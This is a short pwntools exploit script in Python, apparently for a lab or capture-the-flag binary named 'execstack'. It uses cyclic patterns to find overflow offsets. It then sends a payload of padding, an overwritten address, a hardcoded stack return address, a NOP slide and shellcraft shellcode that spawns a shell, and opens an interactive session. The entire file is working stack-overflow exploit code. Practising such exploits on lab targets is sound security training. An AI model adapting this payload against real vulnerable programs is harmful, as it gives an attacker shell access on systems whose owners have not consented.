from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
path = "./execstack"


# io = process(path)
io = gdb.debug(path, '''
        b main
        '''
        )

e = ELF(path)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

addr = 0x7fffffffe4c8
nop_addr = addr+8

bin_echo = 0x402060

cycle = cyclic(500)
offset = cyclic_find(0x62616162)
cmd_offset = cyclic_find(0x6161617261616171)
ret_offset = offset - (cmd_offset+8)


shellcode = asm(shellcraft.sh())
nop_slide = asm('nop') * 72
payload = b"d" * cmd_offset + p64(bin_echo) + b"A" * ret_offset + p64(nop_addr) + nop_slide + shellcode

io.recvuntil(b"Enter your input:\n")
io.sendline(payload)

io.interactive()

